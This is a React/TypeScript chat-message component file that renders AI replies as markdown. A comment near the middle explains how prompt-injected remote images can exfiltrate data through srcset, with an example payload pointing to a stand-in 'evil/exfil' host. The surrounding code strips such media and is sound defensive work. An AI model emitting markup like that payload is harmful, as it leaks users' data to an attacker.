import type { ComponentProps, HTMLAttributes, SVGProps } from "react";
import { memo } from "react";
import {
  ArrowDownTray,
  ArrowPath,
  ArrowsPointingOut,
  Check,
  Loader,
  OpenRectArrowOut,
  SquareTwoStack,
  XMark,
} from "@medusajs/icons";
import { defaultRehypePlugins, type IconMap, Streamdown } from "streamdown";
import { clx, IconButton, Tooltip } from "@medusajs/ui";
import {
  Bubble,
  BubbleContent,
  type BubbleContentProps,
  type BubbleVariant,
} from "./bubble";

type IconComponent = React.ComponentType<
  SVGProps<SVGSVGElement> & { size?: number }
>;

function adaptIcon(
  Icon: React.ComponentType<Omit<React.SVGAttributes<SVGElement>, "children">>,
): IconComponent {
  return ({ size, width, height, ...rest }) => (
    <Icon width={size ?? width} height={size ?? height} {...rest} />
  );
}

const designSystemIcons: Partial<IconMap> = {
  CheckIcon: adaptIcon(Check),
  CopyIcon: adaptIcon(SquareTwoStack),
  DownloadIcon: adaptIcon(ArrowDownTray),
  ExternalLinkIcon: adaptIcon(OpenRectArrowOut),
  Loader2Icon: adaptIcon(Loader),
  Maximize2Icon: adaptIcon(ArrowsPointingOut),
  RotateCcwIcon: adaptIcon(ArrowPath),
  XIcon: adaptIcon(XMark),
};

// Chat role → bubble side. Anything that isn't "user" reads as the counterpart.
export type MessageRole = "user" | "assistant" | (string & {});

export type MessageProps = HTMLAttributes<HTMLDivElement> & {
  from: MessageRole;
  variant?: BubbleVariant;
};

export const Message = ({
  from,
  variant,
  className,
  ...props
}: MessageProps) => (
  <Bubble
    align={from === "user" ? "end" : "start"}
    variant={variant ?? "default"}
    className={clx(
      "group/message gap-2",
      from === "user" ? "is-user" : "is-assistant",
      className,
    )}
    {...props}
  />
);

export type MessageContentProps = BubbleContentProps;

export const MessageContent = (props: MessageContentProps) => (
  <BubbleContent data-testid="chat-message" {...props} />
);

export type MessageActionsProps = ComponentProps<"div">;

export const MessageActions = ({
  className,
  children,
  ...props
}: MessageActionsProps) => (
  <div className={clx("flex items-center gap-1", className)} {...props}>
    {children}
  </div>
);

export type MessageActionProps = ComponentProps<typeof IconButton> & {
  tooltip?: string;
  label?: string;
};

export const MessageAction = ({
  tooltip,
  children,
  label,
  variant = "transparent",
  ...props
}: MessageActionProps) => {
  const button = (
    <IconButton type="button" variant={variant} {...props}>
      {children}
      <span className="sr-only">{label || tooltip}</span>
    </IconButton>
  );

  if (tooltip) {
    return <Tooltip content={tooltip}>{button}</Tooltip>;
  }

  return button;
};

// AI replies are untrusted markdown: a prompt-injected remote image would
// auto-load the moment the browser renders it — no click required — so the
// request itself (query string, headers, timing) can exfiltrate data.
// `Streamdown`'s `urlTransform` prop can't fully close this: it runs against
// `html-url-attributes`' fixed property list, which has no `srcSet` entry,
// and hast-util-sanitize's default schema allows `srcSet` on `<img>` and
// `<source>` with no protocol/origin check at all — so
// `<picture><source srcset="https://evil/exfil?d=secret"></picture>` (or a
// plain `<img srcset="...">`) would load unfiltered even with a same-origin
// `urlTransform`. The rehype plugin below runs *after* Streamdown's own
// raw/sanitize/harden defaults, directly on the sanitized hast tree, and is
// the single mechanism for this (no separate `urlTransform`): it drops
// `srcSet`/`srcset` outright on every element (a srcset is a list of
// candidate URLs — filtering it entry-by-entry isn't worth the complexity
// for a chat surface, and dropping it still leaves a plain `src` to fall
// back to), and removes `src`/`poster` on every element when the URL isn't
// relative, same-origin, or a self-contained `data:` URI (nothing to
// exfiltrate — nothing is fetched over the network). Links are untouched —
// Streamdown's own link-safety modal already gates those.
//
// Exported for direct unit testing of the same-origin/fail-closed decision —
// see message.test.tsx. Streamdown's own default pipeline independently
// blocks some of the same inputs before this ever runs (e.g. it strips
// `data:` `src` values during sanitize, ahead of `harden`'s own
// `allowDataImages` option), so those cases aren't all observable end to end
// through a full `<MessageResponse>` render.
export function isAllowedMediaUrl(url: string): boolean {
  if (url.startsWith("data:")) {
    return true;
  }
  if (typeof window === "undefined") {
    // No origin to compare against — fail closed rather than let an SSR
    // render ship an unchecked remote URL to the client.
    return false;
  }
  try {
    return (
      new URL(url, window.location.origin).origin === window.location.origin
    );
  } catch {
    // Unparsable — fail closed, same as "not allowed".
    return false;
  }
}

interface HastNode {
  type?: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

function stripRemoteMedia(node: HastNode): void {
  if (node.type === "element" && node.properties) {
    delete node.properties.srcSet;
    delete node.properties.srcset;
    for (const key of ["src", "poster"]) {
      const value = node.properties[key];
      if (typeof value === "string" && !isAllowedMediaUrl(value)) {
        delete node.properties[key];
      }
    }
  }
  node.children?.forEach(stripRemoteMedia);
}

function rehypeStripRemoteMedia() {
  return (tree: HastNode) => {
    stripRemoteMedia(tree);
  };
}

// `rehypePlugins` (like `remarkPlugins`) REPLACES Streamdown's defaults
// rather than merging with them, so this appends to the exported
// `defaultRehypePlugins` (raw → sanitize → harden) instead of passing our
// plugin alone, which would silently drop all of Streamdown's own
// sanitization. Built once at module scope: a stable array reference lets
// Streamdown's own internal memoization keep working.
const sanitizedRehypePlugins = [
  ...Object.values(defaultRehypePlugins),
  rehypeStripRemoteMedia,
];

export type MessageResponseProps = ComponentProps<typeof Streamdown>;

export const MessageResponse = memo(
  ({ className, icons, rehypePlugins, ...props }: MessageResponseProps) => (
    <Streamdown
      className={clx(
        "size-full [&>*:first-child]:mt-0 [&>*:last-child]:mb-0",
        className,
      )}
      icons={{ ...designSystemIcons, ...icons }}
      rehypePlugins={rehypePlugins ?? sanitizedRehypePlugins}
      {...props}
    />
  ),
  (prevProps, nextProps) =>
    prevProps.children === nextProps.children &&
    nextProps.isAnimating === prevProps.isAnimating,
);

MessageResponse.displayName = "MessageResponse";

export type MessageToolbarProps = ComponentProps<"div">;

export const MessageToolbar = ({
  className,
  children,
  ...props
}: MessageToolbarProps) => (
  <div
    className={clx(
      "mt-4 flex w-full items-center justify-between gap-4",
      className,
    )}
    {...props}
  >
    {children}
  </div>
);
